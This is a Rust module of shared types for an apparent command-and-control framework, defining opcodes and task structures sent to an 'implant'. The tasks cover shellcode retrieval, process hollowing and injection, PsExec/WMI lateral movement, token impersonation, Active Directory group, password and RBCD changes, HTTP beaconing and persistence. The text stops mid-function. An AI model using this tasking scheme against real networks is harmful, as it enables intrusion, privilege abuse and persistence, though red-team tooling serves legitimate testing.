//! Common types shared between client, server, and implant
//!
//! This module defines the command types and opcodes used throughout the system.

pub mod compiler;
pub mod stubs;

#[cfg(feature = "tui")]
pub mod tui;

use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use uuid::Uuid;

/// Deserialize an optional u32 from either a hex string ("0x..."), decimal string, or a number.
fn deserialize_opt_hex_u32<'de, D>(deserializer: D) -> Result<Option<u32>, D::Error>
where
    D: serde::Deserializer<'de>,
{
    use serde::de::Error;
    #[derive(Deserialize)]
    #[serde(untagged)]
    enum HexOrNum {
        Str(String),
        Num(u32),
    }
    let opt: Option<HexOrNum> = Option::deserialize(deserializer)?;
    match opt {
        None => Ok(None),
        Some(HexOrNum::Num(n)) => Ok(Some(n)),
        Some(HexOrNum::Str(s)) => {
            let s = s.trim();
            if s.starts_with("0x") || s.starts_with("0X") {
                u32::from_str_radix(&s[2..], 16)
                    .map(Some)
                    .map_err(|_| D::Error::custom(format!("invalid hex u32: {s}")))
            } else {
                s.parse::<u32>()
                    .map(Some)
                    .map_err(|_| D::Error::custom(format!("invalid u32 string: {s}")))
            }
        }
    }
}

/// Deserialize a conditional mode from either a string ("data", "error") or a u8.
fn deserialize_conditional_mode<'de, D>(deserializer: D) -> Result<u8, D::Error>
where
    D: serde::Deserializer<'de>,
{
    use serde::de::Error;
    #[derive(Deserialize)]
    #[serde(untagged)]
    enum ModeValue {
        Str(String),
        Num(u8),
    }
    match ModeValue::deserialize(deserializer)? {
        ModeValue::Str(s) => match s.as_str() {
            "data"  => Ok(0),
            "error" => Ok(1),
            other   => Err(D::Error::custom(format!("unknown conditional mode: {other}"))),
        },
        ModeValue::Num(n) => Ok(n),
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// OPCODES
// ═══════════════════════════════════════════════════════════════════════════

/// Bytecode opcodes - must match the implant's interpreter
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[repr(u8)]
pub enum Opcode {
    End = 0x00,
    StoreResult = 0x01,
    GetShellcode = 0x02,
    Sleep = 0x03,
    RunCommand = 0x04,
    GetCwd = 0x05,
    ReadFile = 0x06,
    WriteFile = 0x07,
    CheckError = 0x08,
    Conditional = 0x09,
    SetVar = 0x0A,
    PrintVar = 0x0B,
    Goto = 0x0C,
    Migrate = 0x0D,
    ListProcs = 0x0E,
    GetConst = 0x0F,
    WmiExec = 0x10,
    HttpSend = 0x11,
    Sacrificial = 0x12,
    RedirectStdout = 0x13,
    ShellcodeServer = 0x14,
    ResolveHostname = 0x15,
    PsExec = 0x16,
    GenerateExe = 0x17,
    RunBof = 0x18,
    QueryLdap = 0x19,
    SetAdAttrStr = 0x1A,
    SetAdAttrBin = 0x1B,
    Portscan = 0x1C,
    SetUserPassword = 0x1D,
    AddUserToLocalgroup = 0x1E,
    RemoveUserFromLocalgroup = 0x1F,
    GetUserSid = 0x20,
    AddUserToGroup = 0x21,
    RemoveUserFromGroup = 0x22,
    CreateRbcdAce = 0x23,
    RegCreateKey = 0x24,
    RegDeleteKey = 0x25,
    RegSetValue = 0x26,
    RegQueryValue = 0x27,
    MakeToken = 0x28,
    ImpersonateProcess = 0x29,
    EnablePrivilege = 0x2A,
    ListProcessPrivs = 0x2B,
    ListThreadPrivs = 0x2C,
    DeleteFile = 0x2D,
    RevertToSelf = 0x2E,
    StartService = 0x2F,
    DeleteService = 0x30,
    CreateThread = 0x31,
    GenerateDll = 0x32,
    ShellExecute = 0x33,
    ShellExtract = 0x34,
    ShellExecuteExplorer = 0x35,
    LoadLibrary = 0x36,
    PyExec = 0x37,
    Hollow = 0x38,
    MigrateApc = 0x39,
    RegisterService = 0x3A,
    ExitProcess = 0x3B,
    HollowApc = 0x3C,
    FridaHook = 0x3F,
    FridaUnhook = 0x40,
    Kill = 0x42,
    HttpBeacon = 0x43,
    MemRead = 0x44,
    DllList = 0x45,
    MemMap = 0x46,
    Malfind = 0x47,
    LdrCheck = 0x48,
}

impl Opcode {
    /// Get the opcode name as a string (for JSON serialization)
    pub fn name(&self) -> &'static str {
        match self {
            Opcode::End => "end",
            Opcode::StoreResult => "store_result",
            Opcode::GetShellcode => "get_shellcode",
            Opcode::Sleep => "sleep",
            Opcode::RunCommand => "run_command",
            Opcode::GetCwd => "get_cwd",
            Opcode::ReadFile => "read_file",
            Opcode::WriteFile => "write_file",
            Opcode::CheckError => "check_error",
            Opcode::Conditional => "conditional",
            Opcode::SetVar => "set_var",
            Opcode::PrintVar => "print_var",
            Opcode::Goto => "goto",
            Opcode::Migrate => "migrate",
            Opcode::ListProcs => "list_procs",
            Opcode::GetConst => "get_const",
            Opcode::WmiExec => "wmi_exec",
            Opcode::HttpSend => "http_send",
            Opcode::Sacrificial => "sacrificial",
            Opcode::RedirectStdout => "redirect_stdout",
            Opcode::ShellcodeServer => "shellcode_server",
            Opcode::ResolveHostname => "resolve_hostname",
            Opcode::PsExec => "psexec",
            Opcode::GenerateExe => "generate_exe",
            Opcode::RunBof => "run_bof",
            Opcode::QueryLdap => "query_ldap",
            Opcode::SetAdAttrStr => "set_ad_attr_str",
            Opcode::SetAdAttrBin => "set_ad_attr_bin",
            Opcode::Portscan => "portscan",
            Opcode::SetUserPassword => "set_user_password",
            Opcode::AddUserToLocalgroup => "add_user_to_localgroup",
            Opcode::RemoveUserFromLocalgroup => "remove_user_from_localgroup",
            Opcode::GetUserSid => "get_user_sid",
            Opcode::AddUserToGroup => "add_user_to_group",
            Opcode::RemoveUserFromGroup => "remove_user_from_group",
            Opcode::CreateRbcdAce => "create_rbcd_ace",
            Opcode::RegCreateKey => "reg_create_key",
            Opcode::RegDeleteKey => "reg_delete_key",
            Opcode::RegSetValue => "reg_set_value",
            Opcode::RegQueryValue => "reg_query_value",
            Opcode::MakeToken => "make_token",
            Opcode::ImpersonateProcess => "impersonate_process",
            Opcode::EnablePrivilege => "enable_privilege",
            Opcode::ListProcessPrivs => "list_process_privs",
            Opcode::ListThreadPrivs => "list_thread_privs",
            Opcode::DeleteFile => "delete_file",
            Opcode::RevertToSelf => "revert_to_self",
            Opcode::StartService => "start_service",
            Opcode::DeleteService => "delete_service",
            Opcode::CreateThread => "create_thread",
            Opcode::GenerateDll => "generate_dll",
            Opcode::ShellExecute => "shell_execute",
            Opcode::ShellExtract => "shell_extract",
            Opcode::ShellExecuteExplorer => "shell_execute_explorer",
            Opcode::LoadLibrary => "load_library",
            Opcode::PyExec => "pyexec",
            Opcode::Hollow => "hollow",
            Opcode::MigrateApc => "migrate_apc",
            Opcode::RegisterService => "register_service",
            Opcode::ExitProcess => "exit_process",
            Opcode::HollowApc => "hollow_apc",
            Opcode::FridaHook => "frida_hook",
            Opcode::FridaUnhook => "frida_unhook",
            Opcode::Kill => "kill",
            Opcode::HttpBeacon => "http_beacon",
            Opcode::MemRead => "mem_read",
            Opcode::DllList => "dll_list",
            Opcode::MemMap => "mem_map",
            Opcode::Malfind => "malfind",
            Opcode::LdrCheck => "ldr_check",
        }
    }

    /// Get opcode from name
    pub fn from_name(name: &str) -> Option<Opcode> {
        match name {
            "end" => Some(Opcode::End),
            "store_result" => Some(Opcode::StoreResult),
            "get_shellcode" => Some(Opcode::GetShellcode),
            "sleep" => Some(Opcode::Sleep),
            "run_command" => Some(Opcode::RunCommand),
            "get_cwd" => Some(Opcode::GetCwd),
            "read_file" => Some(Opcode::ReadFile),
            "write_file" => Some(Opcode::WriteFile),
            "check_error" => Some(Opcode::CheckError),
            "conditional" => Some(Opcode::Conditional),
            "set_var" => Some(Opcode::SetVar),
            "print_var" => Some(Opcode::PrintVar),
            "goto" => Some(Opcode::Goto),
            "migrate" => Some(Opcode::Migrate),
            "list_procs" => Some(Opcode::ListProcs),
            "get_const" => Some(Opcode::GetConst),
            "wmi_exec" => Some(Opcode::WmiExec),
            "http_send" => Some(Opcode::HttpSend),
            "sacrificial" => Some(Opcode::Sacrificial),
            "redirect_stdout" => Some(Opcode::RedirectStdout),
            "shellcode_server" => Some(Opcode::ShellcodeServer),
            "resolve_hostname" => Some(Opcode::ResolveHostname),
            "psexec" => Some(Opcode::PsExec),
            "generate_exe" => Some(Opcode::GenerateExe),
            "run_bof" => Some(Opcode::RunBof),
            "query_ldap" => Some(Opcode::QueryLdap),
            "set_ad_attr_str" => Some(Opcode::SetAdAttrStr),
            "set_ad_attr_bin" => Some(Opcode::SetAdAttrBin),
            "portscan" => Some(Opcode::Portscan),
            "set_user_password" => Some(Opcode::SetUserPassword),
            "add_user_to_localgroup" => Some(Opcode::AddUserToLocalgroup),
            "remove_user_from_localgroup" => Some(Opcode::RemoveUserFromLocalgroup),
            "get_user_sid" => Some(Opcode::GetUserSid),
            "add_user_to_group" => Some(Opcode::AddUserToGroup),
            "remove_user_from_group" => Some(Opcode::RemoveUserFromGroup),
            "create_rbcd_ace" => Some(Opcode::CreateRbcdAce),
            "reg_create_key" => Some(Opcode::RegCreateKey),
            "reg_delete_key" => Some(Opcode::RegDeleteKey),
            "reg_set_value" => Some(Opcode::RegSetValue),
            "reg_query_value" => Some(Opcode::RegQueryValue),
            "make_token" => Some(Opcode::MakeToken),
            "impersonate_process" => Some(Opcode::ImpersonateProcess),
            "enable_privilege" => Some(Opcode::EnablePrivilege),
            "list_process_privs" => Some(Opcode::ListProcessPrivs),
            "list_thread_privs" => Some(Opcode::ListThreadPrivs),
            "delete_file" => Some(Opcode::DeleteFile),
            "revert_to_self" => Some(Opcode::RevertToSelf),
            "start_service" => Some(Opcode::StartService),
            "delete_service" => Some(Opcode::DeleteService),
            "create_thread" => Some(Opcode::CreateThread),
            "generate_dll" => Some(Opcode::GenerateDll),
            "shell_execute" => Some(Opcode::ShellExecute),
            "shell_extract" => Some(Opcode::ShellExtract),
            "shell_execute_explorer" => Some(Opcode::ShellExecuteExplorer),
            "load_library" => Some(Opcode::LoadLibrary),
            "pyexec" => Some(Opcode::PyExec),
            "hollow" => Some(Opcode::Hollow),
            "migrate_apc" => Some(Opcode::MigrateApc),
            "register_service" => Some(Opcode::RegisterService),
            "exit_process" => Some(Opcode::ExitProcess),
            "hollow_apc" => Some(Opcode::HollowApc),
            "frida_hook" => Some(Opcode::FridaHook),
            "frida_unhook" => Some(Opcode::FridaUnhook),
            "kill" => Some(Opcode::Kill),
            "http_beacon" => Some(Opcode::HttpBeacon),
            "mem_read" => Some(Opcode::MemRead),
            "dll_list" => Some(Opcode::DllList),
            "mem_map" => Some(Opcode::MemMap),
            "malfind" => Some(Opcode::Malfind),
            "ldr_check" => Some(Opcode::LdrCheck),
            _ => None,
        }
    }
}

impl From<u8> for Opcode {
    fn from(byte: u8) -> Self {
        match byte {
            0x00 => Opcode::End,
            0x01 => Opcode::StoreResult,
            0x02 => Opcode::GetShellcode,
            0x03 => Opcode::Sleep,
            0x04 => Opcode::RunCommand,
            0x05 => Opcode::GetCwd,
            0x06 => Opcode::ReadFile,
            0x07 => Opcode::WriteFile,
            0x08 => Opcode::CheckError,
            0x09 => Opcode::Conditional,
            0x0A => Opcode::SetVar,
            0x0B => Opcode::PrintVar,
            0x0C => Opcode::Goto,
            0x0D => Opcode::Migrate,
            0x0E => Opcode::ListProcs,
            0x0F => Opcode::GetConst,
            0x10 => Opcode::WmiExec,
            0x11 => Opcode::HttpSend,
            0x12 => Opcode::Sacrificial,
            0x13 => Opcode::RedirectStdout,
            0x14 => Opcode::ShellcodeServer,
            0x15 => Opcode::ResolveHostname,
            0x16 => Opcode::PsExec,
            0x17 => Opcode::GenerateExe,
            0x18 => Opcode::RunBof,
            0x19 => Opcode::QueryLdap,
            0x1A => Opcode::SetAdAttrStr,
            0x1B => Opcode::SetAdAttrBin,
            0x1C => Opcode::Portscan,
            0x1D => Opcode::SetUserPassword,
            0x1E => Opcode::AddUserToLocalgroup,
            0x1F => Opcode::RemoveUserFromLocalgroup,
            0x20 => Opcode::GetUserSid,
            0x21 => Opcode::AddUserToGroup,
            0x22 => Opcode::RemoveUserFromGroup,
            0x23 => Opcode::CreateRbcdAce,
            0x24 => Opcode::RegCreateKey,
            0x25 => Opcode::RegDeleteKey,
            0x26 => Opcode::RegSetValue,
            0x27 => Opcode::RegQueryValue,
            0x28 => Opcode::MakeToken,
            0x29 => Opcode::ImpersonateProcess,
            0x2A => Opcode::EnablePrivilege,
            0x2B => Opcode::ListProcessPrivs,
            0x2C => Opcode::ListThreadPrivs,
            0x2D => Opcode::DeleteFile,
            0x2E => Opcode::RevertToSelf,
            0x2F => Opcode::StartService,
            0x30 => Opcode::DeleteService,
            0x31 => Opcode::CreateThread,
            0x32 => Opcode::GenerateDll,
            0x33 => Opcode::ShellExecute,
            0x34 => Opcode::ShellExtract,
            0x35 => Opcode::ShellExecuteExplorer,
            0x36 => Opcode::LoadLibrary,
            0x37 => Opcode::PyExec,
            0x38 => Opcode::Hollow,
            0x39 => Opcode::MigrateApc,
            0x3A => Opcode::RegisterService,
            0x3B => Opcode::ExitProcess,
            0x3C => Opcode::HollowApc,
            0x3F => Opcode::FridaHook,
            0x40 => Opcode::FridaUnhook,
            0x42 => Opcode::Kill,
            0x43 => Opcode::HttpBeacon,
            0x44 => Opcode::MemRead,
            0x45 => Opcode::DllList,
            0x46 => Opcode::MemMap,
            0x47 => Opcode::Malfind,
            0x48 => Opcode::LdrCheck,
            _ => Opcode::End, // Unknown opcodes default to End
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// TASK OPERATIONS
// ═══════════════════════════════════════════════════════════════════════════

/// Binary data that can be encoded as hex or base64
#[derive(Debug, Clone, Serialize)]
#[serde(untagged)]
pub enum BinaryData {
    #[serde(with = "hex_bytes")]
    Hex(Vec<u8>),
    #[serde(with = "base64_bytes")]
    Base64(Vec<u8>),
    Raw(Vec<u8>),
}

impl<'de> Deserialize<'de> for BinaryData {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        use serde::de::Error;
        let v = serde_json::Value::deserialize(deserializer)?;
        match &v {
            serde_json::Value::String(s) => {
                if let Ok(b) = hex::decode(s) {
                    return Ok(BinaryData::Hex(b));
                }
                use base64::Engine;
                base64::engine::general_purpose::STANDARD
                    .decode(s)
                    .map(BinaryData::Base64)
                    .map_err(|_| D::Error::custom("expected valid hex or base64 string"))
            }
            serde_json::Value::Object(obj) => {
                if let Some(h) = obj.get("hex").and_then(|v| v.as_str()) {
                    hex::decode(h)
                        .map(BinaryData::Hex)
                        .map_err(|e| D::Error::custom(format!("invalid hex: {e}")))
                } else if let Some(b) = obj.get("base64").and_then(|v| v.as_str()) {
                    use base64::Engine;
                    base64::engine::general_purpose::STANDARD
                        .decode(b)
                        .map(BinaryData::Base64)
                        .map_err(|e| D::Error::custom(format!("invalid base64: {e}")))
                } else {
                    Err(D::Error::custom("binary data object must have 'hex' or 'base64' key"))
                }
            }
            serde_json::Value::Array(_) => serde_json::from_value::<Vec<u8>>(v)
                .map(BinaryData::Raw)
                .map_err(|e| D::Error::custom(format!("invalid byte array: {e}"))),
            _ => Err(D::Error::custom(
                "expected hex/base64 string, {\"hex\":...} object, or byte array",
            )),
        }
    }
}

impl BinaryData {
    pub fn as_bytes(&self) -> &[u8] {
        match self {
            BinaryData::Hex(b) | BinaryData::Base64(b) | BinaryData::Raw(b) => b,
        }
    }
}

impl From<Vec<u8>> for BinaryData {
    fn from(v: Vec<u8>) -> Self {
        BinaryData::Raw(v)
    }
}

/// Variable reference ($0, $1, etc.) or constant reference (%0, %1, etc.)
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(untagged)]
pub enum ValueRef {
    /// Variable reference: $n
    Var(u16),
    /// Constant reference: %n
    Const(u16),
    /// Literal string
    String(String),
    /// Literal number
    Number(i64),
    /// Literal bytes
    Bytes(BinaryData),
}

impl From<&str> for ValueRef {
    fn from(s: &str) -> Self {
        ValueRef::String(s.to_string())
    }
}

impl From<String> for ValueRef {
    fn from(s: String) -> Self {
        ValueRef::String(s)
    }
}

impl From<i64> for ValueRef {
    fn from(n: i64) -> Self {
        ValueRef::Number(n)
    }
}

impl From<u32> for ValueRef {
    fn from(n: u32) -> Self {
        ValueRef::Number(n as i64)
    }
}

/// Task operations that can be sent to an implant
fn default_beacon_interval() -> u32 { 5000 }

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "op", rename_all = "snake_case")]
pub enum Task {
    // ─────────────────────────────────────────────────────────────────────
    // Core Operations
    // ─────────────────────────────────────────────────────────────────────

    /// End of task set
    End,

    /// Store last result in variable
    StoreResult { var: u16 },

    /// Set variable to value
    SetVar { var: u16, data: ValueRef },

    /// Print variable (for debugging)
    PrintVar {
        #[serde(default)]
        var: Option<u16>,
    },

    /// Check error status of variable
    CheckError { var: u16 },

    /// Unconditional jump to task index
    Goto { target: u16 },

    /// Sleep for milliseconds
    Sleep { ms: u32 },

    // ─────────────────────────────────────────────────────────────────────
    // Command Execution
    // ─────────────────────────────────────────────────────────────────────

    /// Run a shell command
    RunCommand { command: ValueRef },

    /// Get current working directory
    GetCwd,

    /// List running processes
    ListProcs,

    /// Execute via WMI
    WmiExec {
        command: ValueRef,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        host: Option<ValueRef>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        user: Option<ValueRef>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        pass: Option<ValueRef>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        domain: Option<ValueRef>,
    },

    /// Execute via PsExec (deploys service on target)
    #[serde(rename = "psexec")]
    PsExec {
        target: ValueRef,
        service_name: ValueRef,
        display_name: ValueRef,
        binary_path: ValueRef,
        service_bin: ValueRef,
    },

    /// Load Python DLL from URL and execute script
    #[serde(rename = "pyexec")]
    PyExec {
        url: ValueRef,
        script: ValueRef,
    },

    /// Shell execute via COM. Args: path, verb, args
    ShellExecute {
        path: ValueRef,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        verb: Option<ValueRef>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        args: Option<ValueRef>,
    },

    /// Shell execute via explorer.exe (parent is explorer)
    ShellExecuteExplorer {
        path: ValueRef,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        verb: Option<ValueRef>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        args: Option<ValueRef>,
    },

    // ─────────────────────────────────────────────────────────────────────
    // File Operations
    // ─────────────────────────────────────────────────────────────────────

    /// Read file contents
    ReadFile { path: ValueRef },

    /// Write data to file
    WriteFile { path: ValueRef, content: ValueRef },

    /// Delete a file
    DeleteFile { path: ValueRef },

    /// Redirect stdout to file
    RedirectStdout { path: ValueRef },

    /// Load a DLL
    LoadLibrary { path: ValueRef },

    // ─────────────────────────────────────────────────────────────────────
    // Network Operations
    // ─────────────────────────────────────────────────────────────────────

    /// Send HTTP request
    HttpSend {
        method: ValueRef,
        host: ValueRef,
        port: u16,
        path: ValueRef,
        #[serde(default)]
        secure: bool,
        #[serde(default)]
        body: Option<ValueRef>,
    },

    /// Start HTTP beacon
    HttpBeacon {
        host: ValueRef,
        port: u16,
        #[serde(default = "default_beacon_interval")]
        interval: u32,
        #[serde(default)]
        secure: bool,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        agent_id: Option<ValueRef>,
    },

    /// Resolve hostname to IP
    ResolveHostname { hostname: ValueRef },

    /// Port scan
    Portscan {
        #[serde(alias = "host")]
        targets: ValueRef,
        ports: ValueRef,
    },

    // ─────────────────────────────────────────────────────────────────────
    // Process Operations
    // ─────────────────────────────────────────────────────────────────────

    /// Kill process/implant
    Kill {
        #[serde(default, deserialize_with = "deserialize_opt_hex_u32")]
        magic: Option<u32>,
    },

    /// Exit the implant process
    ExitProcess {
        #[serde(default)]
        exit_code: u32,
    },

    /// Migrate to process matching search string
    Migrate {
        /// Process search string (matches image name or cmdline)
        search: ValueRef,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        task_id: Option<u8>,
        #[serde(default, skip_serializing_if = "Option::is_none", deserialize_with = "deserialize_opt_hex_u32")]
        magic: Option<u32>,
    },

    /// Spawn image and inject via APC
    MigrateApc {
        image: ValueRef,
        task_id: u8,
        #[serde(default, skip_serializing_if = "Option::is_none", deserialize_with = "deserialize_opt_hex_u32")]
        magic: Option<u32>,
    },

    /// Process hollowing with JMP stub
    Hollow {
        image: ValueRef,
        task_id: u8,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        search: Option<ValueRef>,
    },

    /// Process hollowing with APC
    HollowApc {
        image: ValueRef,
        task_id: u8,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        search: Option<ValueRef>,
    },

    /// Create thread in current process
    CreateThread {
        #[serde(default, alias = "task")]
        task_id: Option<u8>,
        #[serde(default, deserialize_with = "deserialize_opt_hex_u32")]
        magic: Option<u32>,
    },

    /// Sacrificial process with hollowing
    Sacrificial {
        image: ValueRef,
        task_id: u8,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        pipe_name: Option<ValueRef>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        search: Option<ValueRef>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        no_kill: Option<bool>,
    },

    /// Impersonate process by search string (image name or cmdline)
    ImpersonateProcess { search: ValueRef },

    /// Revert to original token
    RevertToSelf,

    // ─────────────────────────────────────────────────────────────────────
    // Shellcode Operations
    // ─────────────────────────────────────────────────────────────────────

    /// Get shellcode from server
    GetShellcode {
        task: ValueRef,
        #[serde(default, deserialize_with = "deserialize_opt_hex_u32")]
        magic: Option<u32>,
    },

    /// Start shellcode server listening on port
    ShellcodeServer {
        port: u16,
        #[serde(default, skip_serializing_if = "Option::is_none", deserialize_with = "deserialize_opt_hex_u32")]
        magic_base: Option<u32>,
    },

    /// Run Beacon Object File
    RunBof {
        bof_data: ValueRef,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        entry: Option<ValueRef>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        inputs: Option<ValueRef>,
    },

    /// Generate EXE with shellcode
    GenerateExe {
        task_id: u8,
    },

    /// Generate DLL with shellcode
    GenerateDll {
        task_id: u8,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        export_name: Option<ValueRef>,
    },

    // ─────────────────────────────────────────────────────────────────────
    // Token & Privilege Operations
    // ─────────────────────────────────────────────────────────────────────

    /// Create token (logon). domain first to match wire order.
    MakeToken {
        #[serde(default, skip_serializing_if = "Option::is_none")]
        domain: Option<ValueRef>,
        username: ValueRef,
        password: ValueRef,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        logon_type: Option<u8>,
    },

    /// Enable a privilege on a process
    EnablePrivilege {
        #[serde(default, skip_serializing_if = "Option::is_none")]
        search: Option<ValueRef>,
        #[serde(alias = "priv_name")]
        privilege: ValueRef,
    },

    /// List process privileges
    ListProcessPrivs {
        #[serde(default, skip_serializing_if = "Option::is_none")]
        search: Option<ValueRef>,
    },

    /// List thread privileges
    ListThreadPrivs,

    // ─────────────────────────────────────────────────────────────────────
    // Registry Operations
    // ─────────────────────────────────────────────────────────────────────

    /// Create registry key
    RegCreateKey { key: ValueRef },

    /// Delete registry key
    RegDeleteKey { key: ValueRef },

    /// Set registry value
    RegSetValue {
        key: ValueRef,
        value_name: ValueRef,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        value_type: Option<ValueRef>,
        value: ValueRef,
    },

    /// Query registry value
    RegQueryValue { key: ValueRef, value_name: ValueRef },

    // ─────────────────────────────────────────────────────────────────────
    // Service Operations
    // ─────────────────────────────────────────────────────────────────────

    /// Start a service
    StartService {
        #[serde(default, skip_serializing_if = "Option::is_none")]
        target: Option<ValueRef>,
        service_name: ValueRef,
    },

    /// Delete a service
    DeleteService {
        #[serde(default, skip_serializing_if = "Option::is_none")]
        target: Option<ValueRef>,
        service_name: ValueRef,
    },

    /// Register current process as a Windows service
    RegisterService {
        #[serde(alias = "name")]
        service_name: ValueRef,
    },

    // ─────────────────────────────────────────────────────────────────────
    // Active Directory Operations
    // ─────────────────────────────────────────────────────────────────────

    /// Query LDAP
    QueryLdap {
        #[serde(default, skip_serializing_if = "Option::is_none")]
        base: Option<ValueRef>,
        filter: ValueRef,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        scope: Option<u8>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        attribute: Option<ValueRef>,
    },

    /// Set AD string attribute
    SetAdAttrStr {
        dn: ValueRef,
        attr: ValueRef,
        value: ValueRef,
    },

    /// Set AD binary attribute
    SetAdAttrBin {
        dn: ValueRef,
        attr: ValueRef,
        value: ValueRef,
    },

    /// Set user password
    SetUserPassword {
        #[serde(default, skip_serializing_if = "Option::is_none")]
        server: Option<ValueRef>,
        username: ValueRef,
        password: ValueRef,
    },

    /// Get user SID
    GetUserSid {
        #[serde(default, skip_serializing_if = "Option::is_none")]
        server: Option<ValueRef>,
        username: ValueRef,
    },

    /// Add user to local group
    AddUserToLocalgroup {
        #[serde(default, skip_serializing_if = "Option::is_none")]
        server: Option<ValueRef>,
        group: ValueRef,
        username: ValueRef,
    },

    /// Remove user from local group
    RemoveUserFromLocalgroup {
        #[serde(default, skip_serializing_if = "Option::is_none")]
        server: Option<ValueRef>,
        group: ValueRef,
        username: ValueRef,
    },

    /// Add user to domain group
    AddUserToGroup {
        #[serde(default, skip_serializing_if = "Option::is_none")]
        server: Option<ValueRef>,
        group: ValueRef,
        username: ValueRef,
    },

    /// Remove user from domain group
    RemoveUserFromGroup {
        #[serde(default, skip_serializing_if = "Option::is_none")]
        server: Option<ValueRef>,
        group: ValueRef,
        username: ValueRef,
    },

    /// Create RBCD ACE
    CreateRbcdAce { sid: ValueRef },

    // ─────────────────────────────────────────────────────────────────────
    // Frida Operations
    // ─────────────────────────────────────────────────────────────────────

    /// Hook with Frida
    FridaHook {
        url: ValueRef,
        script: ValueRef,
        #[serde(default)]
        name: Option<ValueRef>,
        #[serde(default)]
        callback_host: Option<ValueRef>,
        #[serde(default)]
        callback_port: Option<u16>,
        #[serde(default)]
        batch_size: Option<u32>,
        #[serde(default)]
        flush_interval: Option<u32>,
    },

    /// Unhook Frida
    FridaUnhook {
        #[serde(default)]
        hook_id: Option<ValueRef>,
        #[serde(default)]
        name: Option<ValueRef>,
    },

    // ─────────────────────────────────────────────────────────────────────
    // Misc
    // ─────────────────────────────────────────────────────────────────────

    /// Conditional jump. mode=0: data check, mode=1: error check
    Conditional {
        #[serde(deserialize_with = "deserialize_conditional_mode")]
        mode: u8,
        var1: u16,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        var2: Option<u16>,
        #[serde(alias = "true")]
        true_target: u16,
        #[serde(alias = "false")]
        false_target: u16,
    },

    /// Get constant by index
    GetConst {
        #[serde(alias = "const_idx")]
        index: u16,
    },

    /// Shell extract ZIP archive
    ShellExtract { path: ValueRef },

    /// Read memory at address
    MemRead {
        address: ValueRef,
        size: ValueRef,
        #[serde(default)]
        pid: Option<ValueRef>,
    },

    /// List loaded DLLs from PEB LDR
    DllList {
        #[serde(default)]
        pid: Option<ValueRef>,
    },

    /// Enumerate virtual memory regions
    MemMap {
        #[serde(default)]
        pid: Option<ValueRef>,
    },

    /// Find executable private memory (injected code)
    Malfind {
        #[serde(default)]
        pid: Option<ValueRef>,
    },

    /// Cross-reference IMAGE regions against PEB module lists
    LdrCheck {
        #[serde(default)]
        pid: Option<ValueRef>,
    },
}

impl Task {
    /// Get the opcode for this task
    pub fn opcode(&self) -> Opcode {
        match self {
            Task::End => Opcode::End,
            Task::StoreResult { .. } => Opcode::StoreResult,
            Task::SetVar { .. } => Opcode::SetVar,
            Task::PrintVar { .. } => Opcode::PrintVar,
            Task::CheckError { .. } => Opcode::CheckError,
            Task::Goto { .. } => Opcode::Goto,
            Task::Sleep { .. } => Opcode::Sleep,
            Task::RunCommand { .. } => Opcode::RunCommand,
            Task::GetCwd => Opcode::GetCwd,
            Task::ListProcs => Opcode::ListProcs,
            Task::WmiExec { .. } => Opcode::WmiExec,
            Task::PsExec { .. } => Opcode::PsExec,
            Task::PyExec { .. } => Opcode::PyExec,
            Task::ShellExecute { .. } => Opcode::ShellExecute,
            Task::ShellExecuteExplorer { .. } => Opcode::ShellExecuteExplorer,
            Task::ReadFile { .. } => Opcode::ReadFile,
            Task::WriteFile { .. } => Opcode::WriteFile,
            Task::DeleteFile { .. } => Opcode::DeleteFile,
            Task::RedirectStdout { .. } => Opcode::RedirectStdout,
            Task::LoadLibrary { .. } => Opcode::LoadLibrary,
            Task::HttpSend { .. } => Opcode::HttpSend,
            Task::HttpBeacon { .. } => Opcode::HttpBeacon,
            Task::ResolveHostname { .. } => Opcode::ResolveHostname,
            Task::Portscan { .. } => Opcode::Portscan,
            Task::Kill { .. } => Opcode::Kill,
            Task::ExitProcess { .. } => Opcode::ExitProcess,
            Task::Migrate { .. } => Opcode::Migrate,
            Task::MigrateApc { .. } => Opcode::MigrateApc,
            Task::Hollow { .. } => Opcode::Hollow,
            Task::HollowApc { .. } => Opcode::HollowApc,
            Task::CreateThread { .. } => Opcode::CreateThread,
            Task::Sacrificial { .. } => Opcode::Sacrificial,
            Task::ImpersonateProcess { .. } => Opcode::ImpersonateProcess,
            Task::RevertToSelf => Opcode::RevertToSelf,
            Task::GetShellcode { .. } => Opcode::GetShellcode,
            Task::ShellcodeServer { .. } => Opcode::ShellcodeServer,
            Task::RunBof { .. } => Opcode::RunBof,
            Task::GenerateExe { .. } => Opcode::GenerateExe,
            Task::GenerateDll { .. } => Opcode::GenerateDll,
            Task::MakeToken { .. } => Opcode::MakeToken,
            Task::EnablePrivilege { .. } => Opcode::EnablePrivilege,
            Task::ListProcessPrivs { .. } => Opcode::ListProcessPrivs,
            Task::ListThreadPrivs => Opcode::ListThreadPrivs,
            Task::RegCreateKey { .. } => Opcode::RegCreateKey,
